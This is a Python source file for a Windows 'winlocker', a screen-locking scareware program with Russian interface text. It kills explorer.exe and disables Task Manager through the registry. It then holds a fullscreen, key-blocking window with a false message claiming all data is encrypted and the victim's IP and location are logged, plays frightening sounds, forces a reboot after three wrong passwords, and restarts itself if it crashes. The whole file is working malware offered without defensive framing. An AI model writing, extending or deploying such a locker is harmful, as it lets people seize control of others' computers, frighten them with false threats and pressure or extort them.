import tkinter as tk
import os
import sys
import ctypes
import subprocess
import time
import threading
import winreg as reg
import random
import tempfile

# Системные вызовы
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Глобальные переменные
UNLOCKED = False
SCRIPT_PATH = os.path.abspath(sys.argv[0])
SOUND_THREAD_RUNNING = True

# ========== ВСТРОЕННЫЕ СТРАШНЫЕ ЗВУКИ ==========
def play_scary_sound(sound_type="random"):
    """Воспроизведение страшных звуков"""
    
    def generate_scream():
        """Генерация крика через beep"""
        import winsound
        screams = [
            # Крик ужаса 1
            [(800, 50), (1200, 30), (600, 100), (400, 200), (300, 150)],
            # Крик ужаса 2
            [(1000, 40), (1500, 30), (800, 80), (500, 120), (200, 100)],
            # Крик помощи
            [(700, 60), (900, 40), (1100, 30), (600, 90), (350, 180)],
            # Визг
            [(2000, 20), (1800, 20), (1500, 30), (1000, 50), (500, 100)],
            # Детский крик
            [(1200, 50), (1400, 40), (1600, 30), (800, 80), (400, 150)],
        ]
        
        selected = random.choice(screams)
        for freq, duration in selected:
            try:
                winsound.Beep(freq, duration)
            except:
                pass
            time.sleep(0.05)
    
    def generate_horror():
        """Страшные звуки"""
        import winsound
        horrors = [
            # Звук ужаса
            [(300, 200), (200, 150), (150, 100), (100, 50)],
            # Звук боли
            [(400, 100), (350, 80), (300, 60), (250, 40), (200, 30)],
            # Звук зловещий
            [(500, 150), (400, 120), (300, 90), (200, 60), (150, 30)],
            # Звук угрозы
            [(600, 80), (500, 70), (400, 60), (300, 50), (200, 40)],
        ]
        
        selected = random.choice(horrors)
        for freq, duration in selected:
            try:
                winsound.Beep(freq, duration)
            except:
                pass
            time.sleep(0.03)
    
    def generate_whisper():
        """Шепот через beep"""
        import winsound
        try:
            # Шепот (высокие частоты тихо)
            for _ in range(10):
                winsound.Beep(random.randint(2000, 3000), 20)
                time.sleep(0.01)
        except:
            pass
    
    def play_wav_if_exists():
        """Если есть wav файлы - проигрываем"""
        wav_files = ["scream.wav", "horror.wav", "cry.wav", "scary.wav", "help.wav"]
        for wav in wav_files:
            if os.path.exists(wav):
                try:
                    import winsound
                    winsound.PlaySound(wav, winsound.SND_ASYNC)
                    return
                except:
                    pass
    
    def sound_thread():
        try:
            import winsound
            
            if sound_type == "scream":
                generate_scream()
            elif sound_type == "horror":
                generate_horror()
            elif sound_type == "whisper":
                generate_whisper()
            else:
                # Случайный звук
                choice = random.choice(["scream", "horror", "whisper", "random"])
                if choice == "scream":
                    generate_scream()
                elif choice == "horror":
                    generate_horror()
                elif choice == "whisper":
                    generate_whisper()
                else:
                    # Микс звуков
                    generate_scream()
                    time.sleep(0.2)
                    generate_horror()
            
            play_wav_if_exists()
            
        except Exception as e:
            # Если winsound не работает, используем системный beep
            try:
                for _ in range(5):
                    ctypes.windll.kernel32.Beep(random.randint(200, 1500), 100)
                    time.sleep(0.05)
            except:
                pass
    
    threading.Thread(target=sound_thread, daemon=True).start()

# ========== ФОНТАН СО ЗВУКАМИ ==========
def start_scary_sound_loop():
    """Запуск цикла страшных звуков каждые 15 секунд"""
    def sound_loop():
        global SOUND_THREAD_RUNNING
        sounds = ["scream", "horror", "whisper", "random", "scream", "horror"]
        while SOUND_THREAD_RUNNING:
            # Ждем от 12 до 18 секунд
            wait_time = random.randint(12, 18)
            time.sleep(wait_time)
            if SOUND_THREAD_RUNNING:
                sound_type = random.choice(sounds)
                play_scary_sound(sound_type)
    
    threading.Thread(target=sound_loop, daemon=True).start()

def start_background_noise():
    """Фоновый шум (тихий, но жуткий)"""
    def noise_loop():
        import winsound
        while SOUND_THREAD_RUNNING:
            time.sleep(random.randint(30, 60))
            if SOUND_THREAD_RUNNING:
                try:
                    # Тихий зловещий звук
                    for freq in [400, 350, 300, 250, 200, 150, 100]:
                        winsound.Beep(freq, 30)
                        time.sleep(0.02)
                except:
                    pass
    
    threading.Thread(target=noise_loop, daemon=True).start()

# ========== ПОЛНОЕ УДАЛЕНИЕ ==========
def full_uninstall():
    """Полное удаление винлокера"""
    try:
        # Удаление из реестра
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key, "WinLocker1337")
            reg.CloseKey(key)
        except:
            pass
        
        # Восстановление оболочки
        try:
            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "Shell", 0, reg.REG_SZ, "explorer.exe")
            reg.CloseKey(key)
        except:
            pass
        
        # Удаление службы
        subprocess.run('sc delete WinLocker1337', shell=True, capture_output=True)
        
        # Удаление файлов
        paths_to_delete = [
            r"C:\Windows\System32\winlocker.exe",
            os.path.join(os.environ['TEMP'], 'winlocker.py')
        ]
        for path in paths_to_delete:
            if os.path.exists(path):
                try:
                    os.remove(path)
                except:
                    pass
        
        subprocess.Popen(["explorer.exe"])
    except:
        pass

# ========== ОСНОВНОЙ КЛАСС ВИНЛОКЕРА ==========
class WinLocker:
    def __init__(self):
        self.attempts = 0
        self.max_attempts = 3
        self.password = "1337"
        self.running = True
        
        # Запускаем страшные звуки
        global SOUND_THREAD_RUNNING
        SOUND_THREAD_RUNNING = True
        start_scary_sound_loop()
        start_background_noise()
        
        # Проигрываем звук при старте
        play_scary_sound("scream")
        
        # Применяем блокировки
        self.apply_locks()
        
        # Создаем окно
        self.create_window()
        
        # Защитные потоки
        self.start_protection()
        
        self.root.mainloop()
    
    def apply_locks(self):
        """Блокировка системы"""
        try:
            subprocess.run(["taskkill", "/f", "/im", "explorer.exe"], capture_output=True)
            try:
                key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
                reg.CloseKey(key)
            except:
                pass
        except:
            pass
    
    def start_protection(self):
        """Защитные потоки"""
        def keep_top():
            while self.running:
                try:
                    self.root.attributes("-fullscreen", True)
                    self.root.attributes("-topmost", True)
                    self.root.focus_force()
                    self.root.grab_set()
                except:
                    pass
                time.sleep(0.1)
        
        def prevent_close():
            while self.running:
                try:
                    self.root.protocol("WM_DELETE_WINDOW", lambda: None)
                    self.root.bind("<Alt-F4>", lambda e: "break")
                    self.root.bind("<Escape>", lambda e: "break")
                except:
                    pass
                time.sleep(0.5)
        
        threading.Thread(target=keep_top, daemon=True).start()
        threading.Thread(target=prevent_close, daemon=True).start()
    
    def create_window(self):
        """Создание окна"""
        self.root = tk.Tk()
        self.root.title("")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.overrideredirect(True)
        self.root.grab_set()
        self.root.focus_force()
        
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True, fill="both")
        
        # Анимированный заголовок
        self.title_label = tk.Label(frame, text="⚠️ СИСТЕМА ЗАБЛОКИРОВАНА ⚠️",
                                    font=("Courier New", 40, "bold"), fg="#ff0000", bg="black")
        self.title_label.pack(pady=30)
        
        # Страшный ASCII арт
        scary_art = """
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                                                                           ║
    ║     ██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗                      ║
    ║     ██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                     ║
    ║     ██║     ██║   ██║██║     █████╔╝ █████╗  ██████╔╝                     ║
    ║     ██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗                     ║
    ║     ███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║                     ║
    ║     ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                     ║
    ║                                                                           ║
    ║                      ⚠️ ВНИМАНИЕ! ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН ⚠️            ║
    ║                                                                           ║
    ║                    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░             ║
    ║                    ░  ВСЕ ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ         ░               ║
    ║                    ░  IP-АДРЕС ЗАФИКСИРОВАН               ░               ║
    ║                    ░  МЕСТОПОЛОЖЕНИЕ ОПРЕДЕЛЕНО           ░               ║
    ║                    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░             ║
    ║                                                                           ║
    ║                    ДЛЯ РАЗБЛОКИРОВКИ ВВЕДИТЕ ПАРОЛЬ:                       ║
    ║                                                                           ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
        """
        
        self.msg_label = tk.Label(frame, text=scary_art,
                                  font=("Courier New", 11), fg="#ff3333", bg="black", justify="left")
        self.msg_label.pack(pady=10)
        
        # Поле ввода пароля
        self.entry = tk.Entry(frame, font=("Courier New", 26, "bold"),
                             show="•", justify="center", bg="black",
                             fg="#ff0000", insertbackground="red", width=15)
        self.entry.pack(pady=15)
        self.entry.focus_force()
        self.entry.bind("<Key>", self.only_digits)
        self.entry.bind("<Return>", lambda e: self.check_password())
        
        # Кнопка
        self.btn = tk.Button(frame, text="РАЗБЛОКИРОВАТЬ",
                            font=("Courier New", 18, "bold"), fg="white", bg="#cc0000",
                            command=self.check_password, cursor="hand2")
        self.btn.pack(pady=10)
        
        # Счетчик попыток
        self.attempts_label = tk.Label(frame, text=f"ПОПЫТКИ: 0/{self.max_attempts}",
                                       font=("Courier New", 12), fg="#666666", bg="black")
        self.attempts_label.pack(pady=5)
        
        # Анимация пульсации текста
        self.pulse_animation()
        
        # Анимация смены цветов
        self.color_animation()
        
        # Предупреждение
        warning = tk.Label(frame, text="⚠️ НЕ ЗАКРЫВАЙТЕ ЭТО ОКНО ⚠️\nПРИ ЗАКРЫТИИ ВСЕ ДАННЫЕ БУДУТ УДАЛЕНЫ",
                          font=("Courier New", 10), fg="#ff6666", bg="black")
        warning.pack(side="bottom", pady=15)
        
        # Блокировка всех клавиш
        self.root.bind_all("<Key>", self.block_key)
        
        # Запуск эффекта мерцания
        self.flicker_effect()
    
    def pulse_animation(self):
        """Пульсация текста"""
        def pulse():
            colors = ["#ff0000", "#cc0000", "#990000", "#660000", "#990000", "#cc0000", "#ff0000"]
            i = 0
            while self.running:
                try:
                    self.title_label.config(fg=colors[i % len(colors)])
                    i += 1
                    time.sleep(0.15)
                except:
                    pass
        threading.Thread(target=pulse, daemon=True).start()
    
    def color_animation(self):
        """Анимация смены цветов"""
        def animate():
            colors_bg = ["black", "#110000", "#220000", "#330000", "#220000", "#110000", "black"]
            i = 0
            while self.running:
                try:
                    self.root.configure(bg=colors_bg[i % len(colors_bg)])
                    i += 1
                    time.sleep(0.5)
                except:
                    pass
        threading.Thread(target=animate, daemon=True).start()
    
    def flicker_effect(self):
        """Эффект мерцания текста"""
        def flicker():
            while self.running:
                try:
                    if random.random() < 0.1:  # 10% шанс
                        self.msg_label.config(fg="#ff0000")
                        time.sleep(0.05)
                        self.msg_label.config(fg="#ff3333")
                    time.sleep(0.5)
                except:
                    pass
        threading.Thread(target=flicker, daemon=True).start()
    
    def only_digits(self, event):
        """Только цифры"""
        if event.keysym == "BackSpace":
            return
        if not event.char.isdigit():
            return "break"
    
    def block_key(self, event):
        """Блокировка клавиш"""
        # Экстренная разблокировка Tab+Home
        if event.keysym == "Home" and (event.state & 0x20000):
            self.emergency_unlock()
            return "break"
        
        allowed = ["BackSpace", "Tab", "Return", "Home"]
        if event.keysym in allowed:
            return None
        if event.char.isdigit():
            return None
        return "break"
    
    def check_password(self):
        """Проверка пароля"""
        password = self.entry.get()
        
        if password == self.password:
            # При правильном пароле - радостный звук
            self.unlock_system()
        else:
            self.attempts += 1
            self.entry.delete(0, tk.END)
            self.attempts_label.config(text=f"ПОПЫТКИ: {self.attempts}/{self.max_attempts}", fg="#ff0000")
            
            # Проигрываем страшный звук
            play_scary_sound("scream")
            
            if self.attempts >= self.max_attempts:
                # Финальный крик
                for _ in range(3):
                    play_scary_sound("scream")
                    time.sleep(0.3)
                self.system_destroy()
            else:
                self.root.configure(bg="#330000")
                self.root.after(300, lambda: self.root.configure(bg="black"))
    
    def unlock_system(self):
        """Разблокировка системы"""
        global SOUND_THREAD_RUNNING
        SOUND_THREAD_RUNNING = False
        self.running = False
        
        # Радостный звук при разблокировке
        try:
            import winsound
            for freq in [800, 1000, 1200, 1000, 800]:
                winsound.Beep(freq, 100)
        except:
            pass
        
        full_uninstall()
        
        for widget in self.root.winfo_children():
            widget.destroy()
        
        frame = tk.Frame(self.root, bg="black")
        frame.pack(expand=True, fill="both")
        msg = tk.Label(frame, text="✅ ДОСТУП РАЗРЕШЕН ✅\n\nСИСТЕМА РАЗБЛОКИРОВАНА\nВИНЛОКЕР УДАЛЕН",
                      font=("Courier New", 24, "bold"), fg="#00ff00", bg="black")
        msg.pack(expand=True)
        self.root.update()
        time.sleep(2)
        self.root.destroy()
        sys.exit(0)
    
    def system_destroy(self):
        """Имитация уничтожения системы"""
        global SOUND_THREAD_RUNNING
        SOUND_THREAD_RUNNING = False
        self.running = False
        
        for widget in self.root.winfo_children():
            widget.destroy()
        
        frame = tk.Frame(self.root, bg="red")
        frame.pack(expand=True, fill="both")
        msg = tk.Label(frame, text="💀 СИСТЕМА УНИЧТОЖЕНА 💀\n\nПЕРЕЗАГРУЗКА...",
                      font=("Courier New", 28, "bold"), fg="white", bg="red")
        msg.pack(expand=True)
        self.root.update()
        time.sleep(2)
        
        # Предсмертный крик
        for _ in range(5):
            play_scary_sound("scream")
            time.sleep(0.2)
        
        subprocess.run(["shutdown", "/r", "/t", "0", "/f"], shell=True)
        sys.exit(0)
    
    def emergency_unlock(self):
        """Экстренная разблокировка"""
        global SOUND_THREAD_RUNNING
        SOUND_THREAD_RUNNING = False
        self.running = False
        full_uninstall()
        self.root.destroy()
        sys.exit(0)

if __name__ == "__main__":
    try:
        WinLocker()
    except Exception as e:
        time.sleep(1)
        os.execl(sys.executable, sys.executable, *sys.argv)